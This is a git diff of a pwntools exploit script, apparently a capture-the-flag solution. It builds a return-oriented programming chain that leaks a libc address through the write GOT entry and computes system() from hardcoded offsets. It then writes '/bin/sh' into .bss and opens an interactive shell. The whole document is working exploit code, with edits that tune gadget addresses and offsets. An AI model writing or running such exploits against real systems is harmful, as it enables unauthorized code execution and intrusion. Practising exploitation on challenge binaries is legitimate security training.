@@ -6,7 +6,7 @@ print("--pwned by pwnWiz--")
 print("-------------------")
 print("\n")
 
-context.log_level="debug"
+#context.log_level="debug"
 
 #plt_read = 0x400630
 #plt_write = 0x400600
@@ -33,13 +33,13 @@ payload+="B"*8
 payload+=p64(pppr)
 payload+=p64(0)
 payload+=p64(bss_addr)
-payload+=p64(len("/bin/sh\00"))
+payload+=p64(len("/bin/sh;"))
 payload+=p64(plt_read)
 
 #read plt_write
 payload+=p64(pppr)
 payload+=p64(1)
-payload+=p64(got_read)
+payload+=p64(got_write)
 payload+=p64(0x8)
 payload+=p64(plt_write)
 
@@ -51,28 +51,36 @@ payload+=p64(0x8)
 payload+=p64(plt_read)
 
 #use plt_write as system()
-payload+=p64(plt_write)
-payload+=p64(0x8)
+payload+=p64(0x400775)
 payload+=p64(bss_addr)
+payload+=p64(plt_write)
+payload+="AAAAAAAA"
 
 #send payload
 r.send(payload)
-
-#insert /bin/sh\00 to bss_addr
-r.sendline("/bin/sh\00")
+log.info("payload sended!")
 
 #read got_write 
 r.recv(0x183)
+log.info("parrot detour")
+
+r.sendline("/bin/sh")
+log.info("/bin/sh sended to bss_addr!")
+
 leak_libc=u64(r.recv(8))
 print "leak_libc : " + str(hex(leak_libc))
 
 #offset to system
-offset=0x9ad50
+offset=0xb1f20 #write-system
+#offset=0xb1ec0 read-system
+#offset=0x9ad50 #libc read-system
 system_addr = leak_libc-offset
 print "system_addr : " + str(hex(system_addr))
 
 #send system_addr
 r.sendline(p64(system_addr))
+log.info("system_addr sended!")
 
 #get shell
+log.info("shell!! :<")
 r.interactive()
